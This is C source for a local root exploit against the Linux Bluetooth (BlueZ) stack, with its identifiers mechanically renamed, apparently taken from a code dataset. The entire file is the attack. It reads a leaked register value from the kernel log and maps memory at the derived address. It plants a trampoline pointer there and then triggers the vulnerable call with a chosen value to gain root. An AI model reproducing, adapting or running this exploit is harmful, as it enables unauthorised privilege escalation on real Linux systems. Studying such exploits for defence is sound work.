
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct utsname {char* release; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int FUNC_0 (void*) ;
 int FUNC_1 (int) ;
 scalar_t__ FUNC_2 () ;
 int FUNC_3 () ;
 int FUNC_4 () ;
 int VAR_7 ;
 int FUNC_5 (int,char*,int) ;
 int VAR_8 ;
 int* FUNC_6 (void*,int,int,int,int ,int ) ;
 int FUNC_7 (char*,...) ;
 int FUNC_8 (int ,int ,unsigned int) ;
 char* FUNC_9 (char*,char*) ;
 unsigned int FUNC_10 (char*,int ,int ) ;
 int VAR_9 ;
 scalar_t__ FUNC_11 (struct utsname*) ;
 int FUNC_12 (char*) ;
 int FUNC_13 (int) ;

FUNC_14(int VAR_10, char *VAR_11[])
{
char VAR_12[2048];
int VAR_13, *VAR_14 = (int*)VAR_12;
int *VAR_15 = 0;

unsigned int VAR_16;
int VAR_17;
char *VAR_18;
struct utsname VAR_19;

VAR_7 = FUNC_3();
VAR_9 = FUNC_4();

FUNC_7("-|-bluez local root exploit v.0.9  -by qobaiashi-\n |\n");
if (FUNC_11(&VAR_19) < 0)
   FUNC_7(" |- couldn't determine kernel version\n");

else
    FUNC_7(" |- i've found kernel %s\n", VAR_19.release);


FUNC_7(" |- trampoline is at %p\n", &VAR_8);


if (VAR_10 < 2)
   {
    FUNC_12(VAR_11[0]);
    FUNC_1(1);
    }

if (VAR_10 == 2)
    VAR_16 = FUNC_10(VAR_11[1], 0, 0);


if (FUNC_2() != 0)
   {

   FUNC_13(1000);
   if ((VAR_17 = FUNC_5(0x3, VAR_12, 1700)) > -1)
       {
        VAR_18 = FUNC_9(VAR_12, "ecx: ");
        FUNC_7(" |- [%0.14s]\n", VAR_18);
        VAR_18+=5;
        *(VAR_18+9) = 0x00;*(--VAR_18) = 'x';*(--VAR_18) = '0';
        VAR_14 = (unsigned int*)FUNC_10(VAR_18, 0, 0);

        int *VAR_20 = VAR_14;
        VAR_14 = (int)VAR_14 &~ 0x00000fff;
        VAR_15 =
FUNC_6((void*)VAR_14,0x2000,VAR_5|VAR_4,VAR_3|VAR_1|VAR_2,0,0);
        if(VAR_15 == VAR_14)
          {
           FUNC_7(" |- suitable value found!using %p\n", VAR_14);
           FUNC_7(" |- the time has come to push the button... \n");
           for (VAR_13 = 0;VAR_13 <= 1;VAR_13++)
                *(VAR_20++) = (int)&VAR_8;
           }

           else
             {
              FUNC_7(" |- could not mmap   %p\n", VAR_14);
              if( FUNC_0((void*)VAR_14+0x200 ) == -1)
                {
                 FUNC_7(" |- could not brk to %p\n", VAR_14);
                 FUNC_7(" `-------------------------------\n");
                 FUNC_1(-1);
                 }

              FUNC_7(" |- suitable value found!using %p\n", VAR_14);
              FUNC_7(" |- the time has come to push the button... \n");
              for (VAR_13 = 0;VAR_13 <= 1;VAR_13++)
                  *(VAR_20++) = (int)&VAR_8;

              }
           if ((VAR_13 = FUNC_8(VAR_0, VAR_6, VAR_16)) < 0)
               FUNC_1(1);

        }
   return 0;
   }

if (FUNC_2() == 0)
{
  FUNC_7(" |- trying...\n");
  if ((VAR_13 = FUNC_8(VAR_0, VAR_6, VAR_16)) < 0)
      {
      FUNC_7(" |- something went w0rng (invalid value)\n");
      FUNC_1(1);
     }
}

FUNC_1(0);
}
